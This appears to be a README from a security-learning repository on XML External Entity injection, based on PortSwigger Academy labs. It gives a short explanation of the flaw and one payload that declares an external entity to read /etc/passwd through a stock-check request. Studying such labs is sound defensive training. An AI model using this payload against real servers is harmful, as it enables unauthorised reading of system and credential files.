# 📂 XML External Entity (XXE) Injection

This directory contains payloads and methodologies for exploiting **XXE injection** vulnerabilities discovered in PortSwigger Academy labs.

## 📝 Description
XXE injection is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server file system and to interact with any back-end or external systems that the application itself can access.

## 🛠️ Key Attack Vectors

### 1. Exploiting XXE to retrieve files
Used to retrieve the contents of arbitrary files from the server.
**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
